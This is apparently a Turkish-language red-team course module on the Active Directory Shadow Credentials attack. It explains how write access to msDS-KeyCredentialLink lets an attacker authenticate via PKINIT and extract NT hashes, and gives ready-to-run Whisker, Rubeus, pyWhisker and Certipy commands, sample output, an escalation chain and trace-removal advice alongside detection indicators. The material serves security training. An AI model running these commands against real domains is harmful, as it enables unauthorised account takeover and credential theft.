## 1. Kavramsal Temel — Neden Var?

[05.1](./05.1_DACL_Abuse.md)'de bir hedefi ele geçirmenin klasik yolu **parolasını sıfırlamaktı** — ama bu servisi bozar ve iz bırakır. Shadow Credentials çok daha zarif:

> **Windows Hello for Business / PKINIT için, bir hesabın `msDS-KeyCredentialLink` özniteliğine "alternatif kimlik doğrulama anahtarları" (public key) yazılabilir. Bu öznitelik üzerinde yazma hakkın varsa, hedefe KENDİ ürettiğin bir anahtar çiftinin public kısmını eklersin. Artık private key'inle o hesap olarak PKINIT üzerinden TGT alırsın — parolayı hiç değiştirmeden, hesabı bozmadan, sessizce kimliğe bürünürsün.**

Bu neden güçlü? (1) Parola değişmez → servis çökmez, kullanıcı fark etmez; (2) Sertifika/anahtar tabanlı → parola sıfırlansa bile senin anahtarın kalır (kalıcılık); (3) `GenericWrite`/`GenericAll` gibi yaygın hakların **doğrudan kimliğe bürünmeye** dönüşmesini sağlar.

**Analoji:** Birinin kapısına, kilidi değiştirmeden **kendi anahtarının çalışacağı ikinci bir kilit silindiri** eklemek. Sahibi eski anahtarıyla girmeye devam eder (fark etmez), sen de kendi anahtarınla girersin.

## 2. Teknik Derinlik — Key Trust ve PKINIT Zinciri

### 2.1 msDS-KeyCredentialLink ve Key Trust

```
   msDS-KeyCredentialLink : bir hesabın "sahip olduğu" public key'lerin listesi
   (KeyCredential yapısı: KeyID, RawKeyMaterial=public key, KeyUsage, KeySource)

   Normal kullanım: Windows Hello → cihaz TPM'de anahtar üretir, public'i buraya yazar
   Abuse: SEN anahtar çifti üret → public'i hedefin KeyCredentialLink'ine yaz
```

### 2.2 PKINIT ile TGT — parola yerine sertifika

```
   Sen (private key elimde)                          KDC (DC)
     │ AS-REQ (PKINIT): public key ile imzalı        │
     │───────────────────────────────────────────────▶│  ← DC, KeyCredentialLink'teki
     │                                                 │     public key ile imzayı doğrular
     │ AS-REP: TGT + NTLM_SUPPLEMENTAL_CREDENTIAL      │
     │◀───────────────────────────────────────────────│  ← bonus: hedefin NT hash'i de döner!
```

> **Bonus — UnPAC-the-Hash:** PKINIT TGT'si içinde `PAC_CREDENTIAL_INFO` gelir; Rubeus bunu çözerek hedefin **NT hash'ini** de verir (`asktgt /getcredentials`). Yani Shadow Credentials sadece kimliğe bürünme değil, aynı zamanda **hash çıkarma** yoludur → sonra PtH ([04.1](../Modul_04_Yanal_Hareket/04.1_Pass_the_Hash_ve_Overpass_the_Hash.md)).

### 2.2.1 KeyCredential yapısı (paket seviyesi)

`msDS-KeyCredentialLink` çok-değerli bir özniteliktir; her değer bir **DN-Binary** (`B:<len>:<blob>:<DN>`) formatında serileştirilmiş KeyCredential taşır:

```
   KeyCredential (MS-ADTS 2.2.20) alanları:
     Version         : 0x0200
     KeyID           : SHA256(public key)  → benzersiz kimlik (remove için device-id)
     KeyHash         : bütünlük
     RawKeyMaterial  : DER-encoded public key (senin ürettiğin çiftin public'i)
     KeyUsage        : NGC (0x01) = Windows Hello anahtarı
     KeySource       : AD (0x00)
     DeviceId / CustomKeyInfo / KeyApproximateLastLogonTimeStamp
```

> Whisker/Certipy bu blob'u üretip DN-Binary olarak yazar. Savunmacı, `KeyApproximateLastLogonTimeStamp` ile gerçek Hello kaydı arasındaki tutarsızlığı (ör. hesap Hello kullanmıyorken beliren anahtar) IOC olarak kullanır.

### 2.3 Ön koşul: PKINIT / AD CS

Shadow Credentials, ortamda **PKINIT'in desteklenmesini** gerektirir — yani bir AD CS (Enterprise CA) veya en azından DC'lerde KDC sertifikası. AD CS yoksa PKINIT çalışmaz → bu yol kapalıdır (o zaman ForceChangePassword'a dön). Bu, [Modül 07](../Modul_07_AD_CS_PKI_Saldirilari/) ile doğrudan bağlantılıdır.

## 3. Pratik Uygulama — Çok Araçlı

### 3.1 Whisker (Windows, .NET — en yaygın)

```
:: Hedefin KeyCredentialLink'ine anahtar ekle + kullanım komutunu üret
Whisker.exe add /target:svc-sql
::  → çıktı: Rubeus asktgt komutu (üretilen sertifikayla)
Rubeus.exe asktgt /user:svc-sql /certificate:<base64pfx> /password:"..." /getcredentials /nowrap
::  /getcredentials → TGT + NT hash (UnPAC-the-Hash)
```

### 3.2 pyWhisker + gettgtpkinit (Linux)

```bash
# 1) KeyCredential ekle
pywhisker.py -d corp.local -u jdoe -p 'Welcome1' --target svc-sql --action add --dc-ip 10.10.10.5
#    → cert.pem + key.pem + .pfx üretir
# 2) PKINIT ile TGT al
gettgtpkinit.py -cert-pfx svc-sql.pfx -pfx-pass <pass> corp.local/svc-sql svc-sql.ccache
export KRB5CCNAME=svc-sql.ccache
# 3) UnPAC-the-Hash (NT hash çıkar)
getnthash.py -key <AS-REP-key> corp.local/svc-sql
```

### 3.3 Certipy (tek araçta shadow + PKINIT)

```bash
certipy shadow auto -u jdoe@corp.local -p 'Welcome1' -account svc-sql -dc-ip 10.10.10.5
#  → otomatik: KeyCredential ekle → PKINIT TGT → NT hash → KeyCredential temizle
```

**Örnek çıktı (Certipy):**
```
[*] Adding Key Credential to 'svc-sql'
[*] Authenticating as 'svc-sql' via PKINIT
[*] Got TGT
[*] NT hash for 'svc-sql': a1b2c3d4...      ← parola değişmedi, hash elimde
[*] Restoring the old Key Credentials for 'svc-sql'
```

### 3.4 pyWhisker ile listeleme/temizlik (iz yönetimi)

```bash
# Mevcut KeyCredential'ları listele (temizlik/denetim için)
pywhisker.py -d corp.local -u jdoe -p 'Welcome1' --target svc-sql --action list
# Eklediğin KeyCredential'ı DeviceID ile kaldır (IOC bırakma)
pywhisker.py ... --target svc-sql --action remove --device-id <GUID>
```

### 3.5 Whisker + Rubeus tam Windows akışı

```
Whisker.exe add /target:SRV-DB$ /domain:corp.local /dc:dc01.corp.local
:: → Rubeus komutunu verir:
Rubeus.exe asktgt /user:SRV-DB$ /certificate:<pfx> /password:<pw> /getcredentials /ptt
:: /ptt ile bileti enjekte et → SRV-DB makine kimliğiyle işlem
```

**OPSEC notları:**
- **En güvenilir IOC: 5136 üzerinde `msDS-KeyCredentialLink` değişimi.** Bu öznitelik normalde yalnızca Windows Hello kayıt sırasında değişir → beklenmedik bir yazma güçlü sinyaldir ([Blue 07.3](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.3_Sertifika_Tabanli_Kalicilik_Tespiti.md)). Bunun için hedef nesnenin SACL'ında denetim etkin olmalı.
- **Eklediğin KeyCredential'ı temizle.** Certipy `shadow auto` bunu otomatik yapar; manuel akışta (`Whisker remove`) mutlaka geri al — hem tespit hem kalıcı IOC bırakma. Kalıcılık istiyorsan bilinçli bırak ama bunun izlendiğini bil.
- **Parola değiştirmez = servis bozmaz** → ForceChangePassword'a göre çok daha sessiz; servis hesaplarında tercih edilen yoldur.
- **AD CS bağımlılığı:** PKINIT yoksa çalışmaz. Ortamda AD CS varsa ([Modül 07](../Modul_07_AD_CS_PKI_Saldirilari/)) bu yol açıktır; yoksa `msDS-KeyCredentialLink` yazımı işe yaramaz.
- Hedef DC/gMSA gibi özel nesnelerse ek koşullar (KeyCredential doğrulama) devreye girebilir; kullanıcı/bilgisayar hesaplarında en güvenilirdir.

### Gerçek-dünya Shadow Credentials zinciri

```
   1) BloodHound: jdoe → SRV-DB$ (bilgisayar hesabı) üzerinde GenericWrite
   2) certipy shadow auto -account 'SRV-DB$' → makinenin NT hash'i (parola değişmedi)
   3) SRV-DB$ makine hesabı = SRV-DB'de SYSTEM eşdeğeri → Silver Ticket / PtH
   4) veya S4U ile SRV-DB üzerinde herhangi bir kullanıcı olarak CIFS bileti (Modül 06)
   5) SRV-DB LSASS → cache'li admin kimlikleri → yukarı zincir
   Bilgisayar hesabına GenericWrite = makineyi ele geçirme (parola sıfırlama gerekmez).
```

### Ek: Bilgisayar hesabı hedefleme (en yaygın senaryo)

Shadow Credentials en çok **bilgisayar hesaplarında** kullanılır: bir makineye `GenericWrite`'ın varsa (ör. RBCD keşfinde bulunan), KeyCredentialLink ekleyerek makinenin kimliğini alırsın. Makine hesabı ele geçince o makine SYSTEM'i ve delegation yetkileri senindir. Bu yüzden 05.4 ↔ [06.3 RBCD](../Modul_06_Kerberos_Delegation_Saldirilari/) sık birlikte kullanılır.
